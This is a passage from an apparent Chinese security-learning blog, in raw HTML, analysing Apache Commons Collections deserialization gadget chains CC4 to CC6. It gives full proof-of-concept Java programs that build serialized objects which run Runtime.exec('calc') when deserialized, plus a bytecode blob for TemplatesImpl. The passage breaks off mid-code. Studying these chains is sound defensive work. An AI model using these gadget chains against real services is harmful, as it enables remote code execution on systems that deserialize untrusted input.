ABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射设置 Field</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Transformer数组</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//TransformingComparator 实例</span></span><br><span class="line">            <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//PriorityQueue 实例</span></span><br><span class="line">            <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">            priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射设置 Field</span></span><br><span class="line">            Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;;</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">            setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(priorityQueue);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//测试反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大体调用栈：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                        -&gt;ConstantTransformer.transform()</span><br><span class="line">                                    -&gt;InstantiateTransformer.transform()</span><br><span class="line">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                 -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                        -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.8</p><p>这里我们又回到了去触发 LazyMap.get()，只不过我们改变了 LazyMap.get() 的触发方式，不再和 CC1 和 CC3 一样借助 AnnotationInvocationHandler 的反序列化触发。</p><p>这里引入新类 TiedMapEntry：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数，显然我们可以控制 this.map 为 LazyMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//toString函数，注意这里调用了 getValue()</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>综上，通过 TiedMapEntry.toString() 可触发 LazyMap.get()</p><p>BadAttributeValueExpException可以在反序列化时触发 TiedMapEntry.toString()</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line">    <span class="keyword">private</span> Object val;     <span class="comment">//这里可以控制 val 为 TiedMapEntry</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();    <span class="comment">//这里是关键点，调用toString()</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>完整代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformer数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TiedMapEntry 实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//BadAttributeValueExpException 实例</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射设置 val</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大体调用栈：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;BadAttributeValueExpException.readObject()</span><br><span class="line">      -&gt;TiedMapEntry.toString()</span><br><span class="line">          -&gt;TiedMapEntry.getValue()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                            -&gt;InvokerTransformer.transform()</span><br><span class="line">                                -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p><p>用HashMap触发LazyMap.get()</p><p>再研究研究 TiedMapEntry 这个类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Entry</span>, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数，显然我们可以控制 this.map 为 LazyMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hashCode函数，注意这里调用了 getValue()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>反序列化时触发 TiedMapEntry.hashCode()需要用到HashMap</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先看看其 readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        …………</span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putForCreate(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//跟进 putForCreate 方法</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key); <span class="comment">//关键点，我们可以控制 key 为TiedMapEntry，然后计算hash(TiedMapEntry)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">         …………</span><br><span class="line"></span><br><span class="line">        createEntry(hash, key, value, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//跟进 hash 方法</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h ^= k.hashCode();  <span class="comment">//关键点，触发 TiedMapEntry.hashCode()</span></span><br><span class="line">        …………</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>最终代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span 